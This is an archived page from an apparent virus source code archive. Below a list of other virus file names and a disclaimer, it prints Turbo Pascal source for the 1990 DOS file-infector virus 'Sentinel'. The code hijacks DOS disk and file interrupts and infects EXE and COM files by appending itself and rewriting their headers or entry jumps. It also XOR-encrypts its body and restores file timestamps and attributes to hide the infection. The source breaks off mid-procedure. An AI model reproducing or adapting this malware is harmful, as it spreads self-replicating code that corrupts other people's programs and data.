<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: sentinel_pas</title>
<meta name="KEYWORDS" content="sentinel.pas, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for sentinel.pas">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="s2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/s2_asm.php">s2_asm</a><br>
<a href="sabbath_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sabbath_asm.php">sabbath_asm</a><br>
<a href="sad_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sad_asm.php">sad_asm</a><br>
<a href="saddam_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/saddam_pas.php">saddam_pas</a><br>
<a href="sample_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sample_asm.php">sample_asm</a><br>
<a href="santa_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/santa_asm.php">santa_asm</a><br>
<a href="saratoga_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/saratoga_asm.php">saratoga_asm</a><br>
<a href="satanbg_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/satanbg_asm.php">satanbg_asm</a><br>
<a href="satanbug_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/satanbug_asm.php">satanbug_asm</a><br>
<a href="satnlh_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/satnlh_asm.php">satnlh_asm</a><br>
<a href="sbwhywin_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sbwhywin_asm.php">sbwhywin_asm</a><br>
<a href="sc89_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sc89_asm.php">sc89_asm</a><br>
<a href="s_canada_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/s_canada_asm.php">s_canada_asm</a><br>
<a href="scarey_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/scarey_asm.php">scarey_asm</a><br>
<a href="schrunch_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/schrunch_asm.php">schrunch_asm</a><br>
<a href="scorpio_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/scorpio_pas.php">scorpio_pas</a><br>
<a href="scramble_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/scramble_asm.php">scramble_asm</a><br>
<a href="screw_fi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/screw_fi_asm.php">screw_fi_asm</a><br>
<a href="scroll__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/scroll__asm.php">scroll__asm</a><br>
<a href="scroll_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/scroll_asm.php">scroll_asm</a><br>
<a href="scrunch_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/scrunch_asm.php">scrunch_asm</a><br>
<a href="sdfe_gen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sdfe_gen_asm.php">sdfe_gen_asm</a><br>
<a href="seneca_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/seneca_asm.php">seneca_asm</a><br>
<a href="senecab_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/senecab_asm.php">senecab_asm</a><br>
<a href="sent4625_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sent4625_pas.php">sent4625_pas</a><br>
<a href="sentinel_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sentinel_pas.php">sentinel_pas</a><br>
<a href="serg114_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/serg114_asm.php">serg114_asm</a><br>
<a href="serg118e_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/serg118e_asm.php">serg118e_asm</a><br>
<a href="sergant_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sergant_asm.php">sergant_asm</a><br>
<a href="setuprot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/setuprot_asm.php">setuprot_asm</a><br>
<a href="sex666_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sex666_asm.php">sex666_asm</a><br>
<a href="sf_ii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sf_ii_asm.php">sf_ii_asm</a><br>
<a href="sgarden_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sgarden_asm.php">sgarden_asm</a><br>
<a href="shake_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/shake_asm.php">shake_asm</a><br>
<a href="s_happy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/s_happy_asm.php">s_happy_asm</a><br>
<a href="shellt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/shellt_asm.php">shellt_asm</a><br>
<a href="shhs__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/shhs__asm.php">shhs__asm</a><br>
<a href="shhs_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/shhs_asm.php">shhs_asm</a><br>
<a href="shimmer2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/shimmer2_asm.php">shimmer2_asm</a><br>
<a href="shimmer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/shimmer_asm.php">shimmer_asm</a><br>
<a href="shock_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/shock_asm.php">shock_asm</a><br>
<a href="shy_koo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/shy_koo_asm.php">shy_koo_asm</a><br>
<a href="shy-koo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/shy-koo_asm.php">shy-koo_asm</a><br>
<a href="silence2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/silence2_asm.php">silence2_asm</a><br>
<a href="silence_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/silence_asm.php">silence_asm</a><br>
<a href="simplex_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/simplex_asm.php">simplex_asm</a><br>
<a href="sister_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sister_asm.php">sister_asm</a><br>
<a href="sist_j4j_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sist_j4j_asm.php">sist_j4j_asm</a><br>
<a href="sk1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sk1_asm.php">sk1_asm</a><br>
<a href="sk20h_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sk20h_asm.php">sk20h_asm</a><br>
<a href="sk2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sk2_asm.php">sk2_asm</a><br>
<a href="sk_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sk_asm.php">sk_asm</a><br>
<a href="skeleton_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/skeleton_asm.php">skeleton_asm</a><br>
<a href="skism808_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/skism808_asm.php">skism808_asm</a><br>
<a href="s_leszop_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/s_leszop_asm.php">s_leszop_asm</a><br>
<a href="smash_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/smash_asm.php">smash_asm</a><br>
<a href="smile_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/smile_asm.php">smile_asm</a><br>
<a href="smlboot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/smlboot_asm.php">smlboot_asm</a><br>
<a href="smurf__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/smurf__asm.php">smurf__asm</a><br>
<a href="smurf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/smurf_asm.php">smurf_asm</a><br>
<a href="sobj3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sobj3_asm.php">sobj3_asm</a><br>
<a href="sound_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sound_asm.php">sound_asm</a><br>
<a href="spawn_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/spawn_asm.php">spawn_asm</a><br>
<a href="sq2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sq2_asm.php">sq2_asm</a><br>
<a href="squish_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/squish_asm.php">squish_asm</a><br>
<a href="sra1__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sra1__asm.php">sra1__asm</a><br>
<a href="sra2__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sra2__asm.php">sra2__asm</a><br>
<a href="sra2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sra2_asm.php">sra2_asm</a><br>
<a href="sra3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sra3_asm.php">sra3_asm</a><br>
<a href="ssss4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/ssss4_asm.php">ssss4_asm</a><br>
<a href="stack__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stack__asm.php">stack__asm</a><br>
<a href="stack_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stack_asm.php">stack_asm</a><br>
<a href="stackvir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stackvir_asm.php">stackvir_asm</a><br>
<a href="stealth__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stealth__asm.php">stealth__asm</a><br>
<a href="stealth_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stealth_asm.php">stealth_asm</a><br>
<a href="ster1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/ster1_asm.php">ster1_asm</a><br>
<a href="ster2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/ster2_asm.php">ster2_asm</a><br>
<a href="stercul2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stercul2_asm.php">stercul2_asm</a><br>
<a href="sterculi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sterculi_asm.php">sterculi_asm</a><br>
<a href="stioxyl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stioxyl_asm.php">stioxyl_asm</a><br>
<a href="stned_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stned_asm.php">stned_asm</a><br>
<a href="sto_drop_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sto_drop_asm.php">sto_drop_asm</a><br>
<a href="stond____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stond____asm.php">stond____asm</a><br>
<a href="stond_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stond_asm.php">stond_asm</a><br>
<a href="stone_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stone_asm.php">stone_asm</a><br>
<a href="stoned1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stoned1_asm.php">stoned1_asm</a><br>
<a href="stoned_2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stoned_2_asm.php">stoned_2_asm</a><br>
<a href="stoned2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stoned2_asm.php">stoned2_asm</a><br>
<a href="stoned3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stoned3_asm.php">stoned3_asm</a><br>
<a href="stoned4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stoned4_asm.php">stoned4_asm</a><br>
<a href="stoned___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stoned___asm.php">stoned___asm</a><br>
<a href="stoned_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stoned_asm.php">stoned_asm</a><br>
<a href="stoned_f_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stoned_f_asm.php">stoned_f_asm</a><br>
<a href="stonedii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stonedii_asm.php">stonedii_asm</a><br>
<a href="stoneds_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stoneds_asm.php">stoneds_asm</a><br>
<a href="stone-ef_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stone-ef_asm.php">stone-ef_asm</a><br>
<a href="stranger_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stranger_asm.php">stranger_asm</a><br>
<a href="stub_____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stub_____asm.php">stub_____asm</a><br>
<a href="stub____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stub____asm.php">stub____asm</a><br>
<a href="stub___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stub___asm.php">stub___asm</a><br>
<a href="stub__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stub__asm.php">stub__asm</a><br>
<a href="stub_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/stub_asm.php">stub_asm</a><br>
<a href="sturm&amp;_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sturm&_asm.php">sturm&_asm</a><br>
<a href="styx-5b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/styx-5b_asm.php">styx-5b_asm</a><br>
<a href="sumsdos_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sumsdos_asm.php">sumsdos_asm</a><br>
<a href="sundevil_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sundevil_asm.php">sundevil_asm</a><br>
<a href="suriv101_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/suriv101_asm.php">suriv101_asm</a><br>
<a href="suriv_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/suriv_asm.php">suriv_asm</a><br>
<a href="survive__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/survive__asm.php">survive__asm</a><br>
<a href="survive_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/survive_asm.php">survive_asm</a><br>
<a href="susan1__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/susan1__asm.php">susan1__asm</a><br>
<a href="susan1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/susan1_asm.php">susan1_asm</a><br>
<a href="susan_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/susan_asm.php">susan_asm</a><br>
<a href="swansngb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/swansngb_asm.php">swansngb_asm</a><br>
<a href="swansong_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/swansong_asm.php">swansong_asm</a><br>
<a href="swap_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/swap_asm.php">swap_asm</a><br>
<a href="sw__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sw__asm.php">sw__asm</a><br>
<a href="sw_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sw_asm.php">sw_asm</a><br>
<a href="swedish__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/swedish__asm.php">swedish__asm</a><br>
<a href="swedish_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/swedish_asm.php">swedish_asm</a><br>
<a href="s_wxyc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/s_wxyc_asm.php">s_wxyc_asm</a><br>
<a href="s-wxyc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/s-wxyc_asm.php">s-wxyc_asm</a><br>
<a href="sylvia_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sylvia_asm.php">sylvia_asm</a><br>
<a href="sysinfct_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/sysinfct_asm.php">sysinfct_asm</a><br>
<a href="syslock_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/syslock_asm.php">syslock_asm</a><br>
<a href="syslockm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/syslockm_asm.php">syslockm_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

{$A+,B-,D+,E-,F-,I-,L+,N-,O-,R-,S-,V-}
{$M 16384,0,655360}

program Sentinel;

const
	MaxLen		= $65;
	Open		= $3d;
	Rename		= $56;
	GetSetAttr	= $43;
	Create		= $3c;
	CreateNew	= $5b;
	Close		= $3e;
	ExecProg	= $4b;
	ExtOpenCreate 	= $6c;
	Copyright	=

' You won''t hear me, but you''ll feel me... (c) 1990 by Sentinel.'+
' With thanks to Borland. ';

type
	FileHeaderType	= record
			    case integer of
			    0: (Signature		: word;
				ImageSizeRem		: word;
				Pages512		: word;
				RelItems		: word;
				HeaderSize16		: word;
				MinPar			: word;
				MaxPar			: word;
				StartSS			: word;
				StartSP			: word;
				ChkSum			: word;
				StartIP			: word;
				StartCS			: word);
			    1: (JmpCode			: byte;
				JmpOfs			: word);
                          end;

	Registers	= record
			    case integer of
			      0: (bp,es,ds,di,si,dx,cx,bx,ax,ip,cs,flags: word);
			      1: (bpl,bph,esl,esh,dsl,dsh,dil,dih,sil,
				  sih,dl,dh,cl,ch,bl,bh,al,ah: byte);
			  end;

	FileNameType	= array[0..MaxLen] of char;

	CopyRightType	= array[1..Length(Copyright)] of char;

	BufferType	= record
			    FileHeader	: FileHeaderType;
			    Copyright	: CopyRightType;
			    ChkSum	: word;
			    GenNr	: word;
			    MyReg	: registers;
			    CritPtr	: pointer;
			    FileName	: FileNameType;
			    FileHandle  : word;
			  end;

	IntType	= record
		    case integer of
		      13:(Bytes1	: array[1..15] of byte;
			  HDiskPtr	: pointer;
			  Bytes2	: byte;
			  DiskPtr 	: pointer;
			  Bytes3	: byte;
			  Old13Ptr	: pointer);
		      21: (CodeBytes	: array[1..30] of byte;
			   InstrCode	: word;
			   Old21Ptr	: pointer);
		  end;

var
	Int21Ptr	: pointer absolute 0:$84;
	Int13Ptr	: pointer absolute 0:$4C;
	Int24Ptr	: pointer absolute 0:$90;
	Int40Ptr	: pointer absolute 0:$100;
	Int40Seg	: word absolute 0:$102;
	Int41Seg	: word absolute 0:$106;
	Int41SegHi	: byte absolute 0:$107;
	Int41SegLo	: byte absolute 0:$106;
var
	B		: ^BufferType;
const
	SentinelID	= byte('S');



procedure Buffer; forward;
procedure Install; forward;
procedure EnableInterrupts; inline($fb);
procedure DisableInterrupts; inline($fa);


function  ShiftRgt(Num: longint;Times: word): longint;
  inline($59/$58/$5a/$d1/$ea/$d1/$d8/$e2/$fa);


function  ShiftLft(Num: longint;Times: word): longint;
  inline($59/$58/$5a/$d1/$e0/$d1/$d2/$e2/$fa);


function MatchFunc(Func: word): boolean;
  inline($58/$80/$fc/$3d/$74/$27/$80/$fc/$56/$74/$22/$80/$fc/$43/$74/$1d/
	 $80/$fc/$3c/$74/$18/$80/$fc/$5b/$74/$13/$80/$fc/$3e/$74/$e/$80/
	 $fc/$4b/$74/9/$3d/0/$6c/$74/4/$33/$c0/$eb/2/$b0/1);


procedure Move(var Source, Dest; Count: word);
begin
  inline($1e/$c4/$7e/<Dest/$c5/$76/<Source/$8b/$4e/<Count/$fc/$f3/$a4/$1f);
end;


function AbsAddr(Sg,Off: word): longint;
begin
  inline($8b/$46/<Sg/$33/$d2/$b9/4/0/$d1/$e0/$d1/$d2/$e2/$fa/3/$46/<Off/
	 $83/$d2/0/$89/$46/$fc/$89/$56/$fe);
end;


function ExeFile(Sign: word): boolean;
begin
  ExeFile := (Sign = $4d5a) or (Sign = $5a4d);
end;


function MatchExt(var Buff): boolean;
begin
  inline($c4/$76/<Buff/$26/$c4/$04/$8c/$c2/$81/$ca/$20/$20/$d/$20/$20/
	 $c6/$46/$ff/0/$3d/$2e/$63/$75/6/$81/$fa/$6f/$6d/$74/$b/$3d/
	 $2e/$65/$75/$a/$81/$fa/$78/$65/$75/4/$c6/$46/$ff/1);
end;


procedure CritProc;
begin
  inline($5d/$b0/$03/$cf);
end;


procedure Encrpt(Offs,Nr: word);
var
	Cnt	: word;
begin
  for Cnt := 0 to (SizeOf(CopyRightType) + SizeOf(FileHeaderType)) div 2 do
    MemW[CSeg:Offs+Cnt shl 1] := MemW[CSeg:Offs+Cnt shl 1] xor Nr;
end;


function ChkNum(Offs,Len: word): word;
var
	Cnt	: word;
	Chk	: word;
begin
  Chk := 0;
  Dec(Len);
  for Cnt := 0 to Len do Chk := MemW[CSeg:Offs+Cnt shl 1] xor Chk;
  ChkNum := Chk;
end;


procedure Int13;
begin
  inline($5d/$80/$fc/$03/$75/$0f/$80/$fa/$80/$72/$05/
	 $ea/>0/>0/$ea/>0/>0/$ea/>0/>0);
end;


procedure JmpTo21;
begin
  inline($5d/$83/$c4/2/$ea/>0/>0);
end;


procedure MsFunc(var Reg: registers);
begin
  inline($1e/$c5/$76/<Reg/$46/$46/$b9/$b/0/$fc/$ad/$50/$e2/$fc/$9d/$58/
	 $58/$58/$5b/$59/$5a/$5e/$5f/$1f/7/$55/$fa/$9c/$9a/>0/>0/$5d/
	 $9c/$50/$53/$51/$52/$56/$57/$1e/6/$c5/$76/<Reg/$b9/8/0/$46/
	 $46/$8f/4/$e2/$fa/$83/$c6/6/$8f/4/$1f);
end;


procedure Int21(flags,cs,ip,ax,bx,cx,dx,si,di,ds,es,bp: word);
interrupt;
var
	UserReg		: registers absolute bp;
	Buff		: ^BufferType;
	Offs		: word;
label
	Continue;

function NormalFunc: boolean;
begin
  MsFunc(Buff^.MyReg);
  NormalFunc := not Odd(Buff^.MyReg.flags);
end;


procedure PasteIt;
var
	IntProc		: ^IntType;
	Attr		: word;
	Date,Time	: word;
	Segm,Offs	: word;
	FileSize	: longint;
	SaveHeader	: ^FileHeaderType;


procedure PutIt;
var
	Chk	: word;
begin
  Buff^.ChkSum := ChkNum(Ofs(Buffer),(SizeOf(CopyRightType) + SizeOf(FileHeaderType)) shr 1);
  Encrpt(Ofs(Buffer),Buff^.GenNr);
  Buff^.MyReg.ah := $40;
  Buff^.MyReg.ds := CSeg;
  Buff^.MyReg.dx := 0;
  Buff^.MyReg.cx := Ofs(Buffer) + SizeOf(FileHeaderType) + SizeOf(CopyRightType) + 2;
  if NormalFunc and (Buff^.MyReg.ax = Buff^.MyReg. cx) then
    begin
      Buff^.Myreg.ax := $4200;
      Buff^.Myreg.cx := 0;
      Buff^.Myreg.dx := 0;
      if NormalFunc then
	begin
	  Buff^.MyReg.ah := $40;
	  Buff^.MyReg.cx := SizeOf(FileHeaderType);
	  Buff^.MyReg.ds := CSeg;
	  Buff^.MyReg.dx := Ofs(SaveHeader^);
	  if NormalFunc then;
	end;
    end;
  Buff^.MyReg.cx := Time;
  Buff^.MyReg.dx := Date;
  Buff^.MyReg.ax := $5701;
  MsFunc(Buff^.MyReg);
  Encrpt(Ofs(Buffer),Buff^.GenNr);
end;


function NormalAttr: boolean;
begin
  NormalAttr := False;
  Buff^.MyReg.ax := $4300;
  if NormalFunc then
    begin
      Attr := Buff^.MyReg.cx;
      if Attr and 4 = 0 then
	begin
	  NormalAttr := True;
	  if Odd(Attr) then
	    begin
	      Buff^.MyReg.ax := $4301;
	      Buff^.MyReg.cx := Attr and $fffe;
	      if not NormalFunc then NormalAttr := False;
	    end;
	end;
    end;
end;


begin
  IntProc := Ptr(CSeg,Ofs(Int13));
  IntProc^.Old13Ptr := Int13Ptr;
  with Buff^ do
    begin
      CritPtr := Int24Ptr;
      Segm := MyReg.ds;
      Offs := MyReg.dx;
      DisableInterrupts; Int13Ptr := Ptr(CSeg,Ofs(Int13)); Int24Ptr := Ptr(CSeg,Ofs(CritProc)); EnableInterrupts;
      if NormalAttr then
	begin
	  MyReg.ax := $3d02;
	  if NormalFunc then
	    begin
	      with MyReg do
		begin
		  bx := ax;
		  ax := $5700;
		  MsFunc(MyReg);
		  Time := cx;
		  Date := dx;
		  ah := $3f;
		  cx := SizeOf(FileHeaderType);
		  ds := CSeg;
		  dx := Ofs(FileHeader);
		  if NormalFunc then
		    begin
		      ax := $4202;
		      cx := 0;
		      dx := 0;
		      if NormalFunc then
			begin
			  FileSize := ShiftLft(dx,16) + ax;
			  SaveHeader := Ptr(CSeg,Ofs(Buffer) + SizeOf(BufferType));
			  Move(FileHeader,SaveHeader^,SizeOf(FileHeaderType));
			  if ExeFile(FileHeader.Signature) then
			    begin
			      if (FileSize - AbsAddr(FileHeader.HeaderSize16 + FileHeader.StartCS,0) - FileHeader.StartIP <>
				 Ofs(Buffer) - Ofs(Install) + SizeOf(FileHeaderType) + SizeOf(CopyRightType) + 2) and
				 (FileSize > 1000) and (SaveHeader^.MaxPar <> 0) then
				begin
				  with SaveHeader^ do
				    begin
				      StartCS := ShiftRgt(FileSize,4) - HeaderSize16;
				      StartIP := word(FileSize) mod $10 + Ofs(Install);
				      StartSS := StartCS;
				      StartSP := StartIP + Ofs(Buffer) - Ofs(Install) + SizeOf(BufferType) + $200;
				      Inc(FileSize,Ofs(Buffer) + SizeOf(FileHeaderType) + SizeOf(Copyright) + 2);
				      ImageSizeRem := word((FileSize - AbsAddr(HeaderSize16,0))) mod $200;
				      Pages512 := ShiftRgt(FileSize,9);
				      if word(FileSize) mod $200 <> 0 then Inc(Pages512);
				      PutIt;
				    end;
				end;
			    end
			  else
			    begin
			      if (((FileHeader.JmpCode) <> $e9) or
				  (FileSize - FileHeader.JmpOfs - 3 <>
				   Ofs(Buffer) - Ofs(Install) + SizeOf(FileHeaderType) + SizeOf(Copyright) + 2)) and
				  (FileSize > 1000) and (FileSize <= $EA00) then
				begin
				  SaveHeader^.JmpCode := $e9;
				  SaveHeader^.JmpOfs := FileSize + Ofs(Install) - 3;
				  PutIt;
				end;
			    end;
                        end;
		      ah := $3e;
		      MsFunc(MyReg);
                    end;
		end;
	    end;
	  if Odd(Attr) then
	    begin
	      MyReg.ax := $4301;
	      MyReg.cx := Attr;
	      MyReg.ds := Segm;
	      MyReg.dx := Offs;
	      MsFunc(MyReg);
	    end;
